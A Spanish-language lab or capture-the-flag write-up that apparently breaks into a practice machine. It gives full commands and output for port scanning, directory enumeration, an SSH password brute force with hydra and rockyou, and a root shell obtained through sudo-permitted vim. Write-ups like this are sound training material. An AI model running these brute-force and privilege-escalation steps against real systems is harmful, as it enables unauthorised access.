# Herramientas
- Nmap
- Gobuster
- SecLists
- Hydra
# Procedimiento
Escaneamos con nmap y podemos ver que los puertos 22 y 80 estám abiertos. 
```bash
nmap -p- 172.22.0.2                                                         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 11:18 -04  
Nmap scan report for 172.22.0.2  
Host is up (0.0000020s latency).  
Not shown: 65533 closed tcp ports (reset)  
PORT   STATE SERVICE  
22/tcp open  ssh  
80/tcp open  http  
MAC Address: 2A:4B:7A:5E:32:49 (Unknown)  
  
Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

Ingresamos a la página y podemos ver que está el archivo default de Apache.
![[Pasted image 20250714112015.png]]
Utilizamos gobuster para hacer un escaneo de directorios y podemos ver que hay un secret.php. 
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://172.22.0.2/ -x .php,.py,.txt,.html  
===============================================================  
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://172.22.0.2/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.6  
[+] Extensions:              php,py,txt,html  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/.php                 (Status: 403) [Size: 275]  
/.html                (Status: 403) [Size: 275]  
/index.html           (Status: 200) [Size: 10701]  
/secret.php           (Status: 200) [Size: 927]  
/.php                 (Status: 403) [Size: 275]  
/.html                (Status: 403) [Size: 275]  
/server-status        (Status: 403) [Size: 275]  
Progress: 1038215 / 1038220 (100.00%)  
===============================================================  
Finished  
===============================================================
```

Lo abrimos y nos encontramos esto:
![[Pasted image 20250714112332.png]]

Hasta el momento solamente sabemos que puede haber un usuario llamado mario, por lo que procederemos a hacer fuerza bruta con hydra. Los parámetros ocupados son:
- -l: se debe especificar el usuario a probar
- -P: se especifica un diccionario de palabras

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.22.0.2                                          
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organ  
izations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-14 11:26:23  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: u  
se -t 4  
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous sessio  
n found, to prevent overwriting, ./hydra.restore  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per t  
ask  
[DATA] attacking ssh://172.22.0.2:22/  
[22][ssh] host: 172.22.0.2   login: mario   password: chocolate  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-14 11:26:41
```

Con esto vemos que se puede acceder con el usuario mario y contraseña chocolate.
```bash
ssh mario@172.22.0.2                 
The authenticity of host '172.22.0.2 (172.22.0.2)' can't be established.  
ED25519 key fingerprint is SHA256:z6uc1wEgwh6GGiDrEIM8ABQT1LGC4CfYAYnV4GXRUVE.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '172.22.0.2' (ED25519) to the list of known hosts.  
mario@172.22.0.2's password:    
Linux 38462ed4ac9c 6.12.33+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.33-1kali1 (2025-06-25) x86_64  
  
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21  
mario@38462ed4ac9c:~$
```

Procedemos a ver qué permisos tiene el usuario de mario:
```bash
sudo -l
Matching Defaults entries for mario on 38462ed4ac9c:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,  
   use_pty  
  
User mario may run the following commands on 38462ed4ac9c:  
   (ALL) /usr/bin/vim
```

Procedemos a ocupar `sudo -u root /usr/bin/vim`, poner ":" y colocar `!/bin/bash`

```
root@38462ed4ac9c:/home/mario# whoami  
root
```

Y con esto, hemos terminado de hackear la máquina :)